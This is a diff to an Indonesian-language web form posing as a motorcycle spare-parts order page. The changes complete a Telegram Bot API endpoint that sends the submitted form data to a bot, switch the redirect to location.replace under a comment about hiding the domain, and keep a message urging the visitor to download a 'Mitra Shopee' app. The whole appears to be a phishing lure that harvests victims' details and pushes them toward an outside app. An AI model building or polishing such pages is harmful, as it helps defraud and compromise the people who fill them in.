@@ -7,7 +7,7 @@
     <title>Formulir Pemesanan Suku Cadang Motor</title>
     <link rel="stylesheet" href="style.css">
     <!-- Font Awesome untuk ikon -->
-    <link rel="stylesheet" href="">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 
 <body>
@@ -86,7 +86,7 @@
                     "Tahun Motor: " + tahunMotor + "\n" +
                     "Suku Cadang yang Dibutuhkan: " + sukuCadang;
                 // URL endpoint Telegram yang benar
-                var url = "" + token + "/sendMessage";
+                var url = "https://api.telegram.org/bot" + token + "/sendMessage";
                 var params = {
                     chat_id: chat_id,
                     text: text
@@ -103,8 +103,7 @@
                         if (data.ok) {
                             alert('Selamat! Data pemesanan Anda telah diverifikasi. Silahkan download aplikasi Mitra Shopee di Shopee.');
                             // Menyembunyikan tampilan domain
-                            // Opsional: Anda bisa menghapus baris ini jika tidak ingin melakukan redirect
-                            window.location.href = 'index.html';
+                            window.location.replace('index.html');
                         } else {
                             alert('Gagal mengirim ke Telegram: ' + data.description);
                         }
